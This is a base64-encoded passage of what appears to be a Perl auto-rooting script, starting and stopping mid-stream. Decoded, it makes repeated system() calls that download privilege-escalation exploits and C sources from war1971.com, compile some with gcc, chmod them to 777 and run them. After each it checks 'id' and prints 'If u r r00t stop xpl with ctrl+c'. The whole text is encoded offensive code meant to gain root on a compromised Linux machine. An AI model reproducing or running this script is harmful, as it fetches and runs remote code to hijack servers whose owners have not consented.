L2V4cDIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMiIpOyANCnN5c3RlbSgiLi9leHAyIik7 IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ TEVTL2ZpbGUvY2MvZXhwMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHAzIik7IA0Kc3lzdGVt KCIuL2V4cDMiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4cDQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3Nzcg ZXhwNCIpOyANCnN5c3RlbSgiLi9leHA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dl dCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwNSIpOyAgDQpzeXN0ZW0o ImNobW9kIDc3NyBleHA1Iik7IA0Kc3lzdGVtKCIuL2V4cDUiKTsgDQpzeXN0ZW0oImlkIik7IA0K c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA2Iik7 ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4cDYiKTsgDQpzeXN0ZW0oIi4vZXhwNiIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl L2NjL2V4cDciKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwNyIpOyANCnN5c3RlbSgiLi9leHA3 Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T X0ZJTEVTL2ZpbGUvY2MvZXhwOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHA4Iik7IA0Kc3lz dGVtKCIuL2V4cDgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA5Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4 cDkiKTsgDQpzeXN0ZW0oIi4vZXhwOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL3J1bjIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVu MiIpOyANCnN5c3RlbSgiLi9ydW4yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciBy MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcx LmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4 cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDov L3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cGxvaXQyIik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGV4cGxvaXQyIik7IA0Kc3lzdGVtKCIuL2V4cGxvaXQyIik7IA0Kc3lzdGVtKCJpZCIp OyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgi d2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwbG9pdDIiKTsgIA0K c3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdDIiKTsgDQpz eXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4i Ow0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9ydW4y Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bjIiKTsgDQpzeXN0ZW0oIi4vcnVuMiIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkt MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LTEiKTsgDQpzeXN0ZW0oIi4vMjAwOS0xIik7 IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwr Y1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2Mv ZGVybGUuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlLmMgLW8gZGVybGUiKTsgIA0Kc3lzdGVtKCJj aG1vZCA3NzcgZGVybGUiKTsgDQpzeXN0ZW0oIi4vZGVybGUiKTsgDQpzeXN0ZW0oImlkIik7IA0K cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0 IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zLmMiKTsgDQpzeXN0ZW0oImdj YyAzLmMgLW8gMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAzIik7IA0Kc3lzdGVtKCIuLzMiKTsg DQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtj XG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8z YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDNhIik7IA0Kc3lzdGVtKCIuLzNhIik7IA0Kc3lzdGVt KCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5 c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNC5jIik7IA0K c3lzdGVtKCJnY2MgNC5jIC1vIDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNCIpOyANCnN5c3Rl bSgiLi80Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3 aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvNGEiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA0YSIpOyANCnN5c3RlbSgiLi80YSIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9jeC5jIik7IA0Kc3lzdGVtKCJnY2MgY3guYyAtbyBjeCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3 NyBjeCIpOyANCnN5c3RlbSgiLi9jeCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jeHguYyIpOyANCnN5c3RlbSgiZ2NjIGN4eC5jLSBv IGN4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBjeHgiKTsgDQpzeXN0ZW0oIi4vY3h4Iik7IA0K c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu IjsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4 cGxvaXQyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhw bG9pdDIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBydW4gaHR0cDovL3dhcjE5NzEuY29tL0NNU19G SUxFUy9maWxlL2NjL3J1biIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHJ1biIpOyANCnN5c3RlbSgi Li9ydW4iKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvcnVuLnNoIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bi5zaCIpOyANCnN5c3Rl bSgiLi9ydW4uc2giKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy8yOS5jIik7IA0Kc3lzdGVtKCJnY2MgMjkuYyAtbyAyOSIpOyAgDQpzeXN0 ZW0oImNobW9kIDc3NyAyOSIpOyANCnN5c3RlbSgiLi8yOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpw cmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oImh0dHA6 Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zMCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3 NyAzMCIpOyANCnN5c3RlbSgiLi8zMCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAw OSIpOyANCnN5c3RlbSgiLi8yMDA5Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0 IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jIik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGMiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2N4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGN4 Iik7IA0Kc3lzdGVtKCIuL2N4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAw dCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5j b20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVybGUyIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGRlcmxl MiIpOyANCnN5c3RlbSgiLi9kZXJsZTIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUg ciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9kZXJsZSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBk ZXJsZSIpOyANCnN5c3RlbSgiLi9kZXJsZSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzZ4LmMiKTsgIA0Kc3lzdGVtKCJnY2MgNnguYyAt byA2eGEiKTsgDQpzeXN0ZW0oIi4vNnhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1 IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2Fy MTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNngiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNngi KTsgDQpzeXN0ZW0oIi4vNngiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0 IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNv bS9DTVNfRklMRVMvZmlsZS9jYy82YiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2YiIpOyANCnN5 c3RlbSgiLi82YiIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4 cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19G SUxFUy9maWxlL2NjLzZ4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2eHgiKTsgDQpzeXN0ZW0o Ii4vNnh4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3 aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvMjc3MDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjc3MDQiKTsgDQpzeXN0ZW0o Ii4vMjc3MDQiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBs IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklM RVMvZmlsZS9jYy9kZXJsZTIuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlMi5jIC1vIGRlcmxlMiIp OyAgDQpzeXN0ZW0oImNobW9kIDc3NyBkZXJsZTIiKTsgDQpzeXN0ZW0oIi4vZGVybGUyIik7IA0K c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu IjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVy bGUyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZGVybGUyIik7IA0Kc3lzdGVtKCIuL2RlcmxlMiIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy8yOC5jIik7IA0Kc3lzdGVtKCJnY2MgMjguYyAtbyAyOCIpOyANCnN5c3RlbSgiY2htb2QgNzc3 IDI4Iik7IA0Kc3lzdGVtKCIuLzI4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yOCIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy8yNy5jIik7IA0Kc3lzdGVtKCJnY2MgMjcuYyAtbyAyNyIpOyANCnN5c3RlbSgiY2htb2QgNzc3 IDI3Iik7IA0Kc3lzdGVtKCIuLzI3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yNyIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9jLmMiKTsgDQpzeXN0ZW0oImdjYyBjLmMgLW8gYyIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMi KTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jMi5j Iik7IA0Kc3lzdGVtKCJnY2MgYzIuYyAtbyBjMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMyIik7 IA0Kc3lzdGVtKCIuL2MyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9jMiIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8wNSIp OyANCnN5c3RlbSgiY2htb2QgNzc3IDA1Iik7IA0Kc3lzdGVtKCIuLzA1Iik7IA0Kc3lzdGVtKCJp ZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0 ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2lza28iKTsgDQpz eXN0ZW0oImNobW9kIDc3NyBpc2tvIik7IA0Kc3lzdGVtKCIuL2lza28iKTsgDQpzeXN0ZW0oImlk Iik7DQpzeXN0ZW0oIi4vaXNrbyIpOyANCnN5c3RlbSgiaXNrbyIpOw0KcHJpbnQgIklmIHUgciBy MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyAN CnN5c3RlbSgiLi8xOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgiKTsgDQpzeXN0 ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyAN CnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNyIpOyAN CnN5c3RlbSgiY2htb2QgNzc3IDciKTsgDQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsg DQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3Rv cCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D TVNfRklMRVMvZmlsZS9jYy83LTIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA3LTIiKTsgDQpzeXN0 ZW0oIi4vNy0yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi83LTIiKTsgDQpzeXN0ZW0o ImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5 c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOCIpOyANCnN5 c3RlbSgiY2htb2QgNzc3IDgiKTsgDQpzeXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz eXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4 cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf RklMRVMvZmlsZS9jYy84YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDhhIik7IA0Kc3lzdGVtKCIu LzhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi84YSIpOyANCnN5c3RlbSgiaWQiKTsg DQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3 Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy84YmIiKTsgDQpzeXN0ZW0o ImNobW9kIDc3NyA4YmIiKTsgDQpzeXN0ZW0oIi4vOGJiIik7IA0Kc3lzdGVtKCJpZCIpOyANCnBy aW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0ZW0oIndnZXQg aHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzhjYyIpOyANCnN5c3RlbSgiY2ht b2QgNzc3IDhjYyIpOyANCnN5c3RlbSgiLi84Y2MiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOHgiKTsgDQpzeXN0ZW0oImNobW9kIDc3 NyA4eCIpOyANCnN5c3RlbSgiLi84eCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vOHgi KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry bCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv Y2MvOSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDkiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9rcmFkMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGty YWQyIik7IA0Kc3lzdGVtKCIuL2tyYWQyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9r cmFkMiAtdCAxIC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEg LXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZDIgLXQgMSAtcCA0Iik7IA0K c3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkMiAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlk Iik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0 ZW0oIi4va3JhZDIgLXQgMSAtcCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFk MiAtdCAxIC1wIDgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag eHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T X0ZJTEVTL2ZpbGUvY2Mva3JhZCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGtyYWQiKTsgDQpzeXN0 ZW0oIi4va3JhZCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDIi KTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQgLXQgMSAtcCAzIik7IA0Kc3lzdGVt KCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAgNCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz eXN0ZW0oIi4va3JhZCAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2ty YWQgLXQgMSAtcCA2Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAg NyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDgiKTsgDQpzeXN0 ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls ZS9jYy9rLXJhZDMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBrLXJhZDMiKTsgDQpzeXN0ZW0oIi4v ay1yYWQzIC10IDEgLXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10 IDEgLXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNCIp OyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNSIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsg DQpzeXN0ZW0oIi4vay1yYWQzIC10LXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4v ay1yYWQzIC10IC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2stcmFkMyAtYSAt cCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rLXJhZDMgLWEgLXAgNyIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yNjgi KTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyNjgiKTsgDQpzeXN0ZW0oIi4vMjY4Iik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOCIpOyANCnN5c3RlbSgiY2htb2Qg Nzc3IDIwMDgiKTsgDQpzeXN0ZW0oIi4vMjAwOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi 